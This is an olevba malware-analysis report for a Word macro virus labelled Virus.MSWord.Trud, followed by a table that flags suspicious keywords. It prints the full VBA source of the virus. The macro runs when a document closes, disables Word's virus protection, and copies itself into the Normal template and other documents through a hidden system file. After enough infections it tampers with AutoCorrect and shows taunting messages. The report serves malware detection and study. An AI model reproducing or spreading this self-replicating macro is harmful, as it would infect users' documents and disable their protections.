olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Trud-c973a65196c544cd7cd291baa4a2d9c659efb10e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Trud-c973a65196c544cd7cd291baa4a2d9c659efb10e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error GoTo hometime
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
hohoho = 4
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt > 0 And ad > 0 Then GoTo hometime
If Dir("c:\winlogo.sys", vbSystem) = "" And nt = 0 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\winlogo.sys"
    SetAttr "c:\winlogo.sys", vbSystem
    host.codemodule.AddFromFile ("c:\winlogo.sys")
    host.codemodule.replaceline 5, "Private Sub Document_Close()"
Else
    plop = ActiveDocument.Saved
    plop2 = True
    Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    host.codemodule.AddFromFile ("c:\winlogo.sys")
End If
For x = 1 To 4
    host.codemodule.deletelines 1
Next x
hohoho = hohoho + 1
NormalTemplate.VBProject.VBComponents.Item(1).codemodule.replaceline 6, "hohoho = " & hohoho
If hohoho >= 69 Then
    Application.Caption = "Microsoft Turd"
    AutoCorrect.ReplaceText = True
    AutoCorrect.Entries.Add Name:="the", Value:="hte"
    AutoCorrect.Entries.Add Name:="hte", Value:="the"
    Set bln = Assistant.NewBalloon
    With bln
        .Heading = "Isn't life just a bitch"
        .Text = "Choose an option."
        .Labels(1).Text = "Loose all your data."
        .Labels(2).Text = "Loose most of your data."
        .Labels(3).Text = "Loose just enough data to really fuck you off"
        .BalloonType = msoBalloonTypeButtons
        .Mode = msoModeModal
        .Show
    End With
    With ActiveDocument.Content
        .InsertParagraphBefore
        .InsertBefore "Don't Worry About a Thing !!!    I wouldn't fuck up your data !!!"
    End With
    With ActiveDocument.Paragraphs(1).Range.Font
        .ColorIndex = wdGreen
        .Size = 24
    End With
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If plop2 Then ActiveDocument.Saved = plop
hometime:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

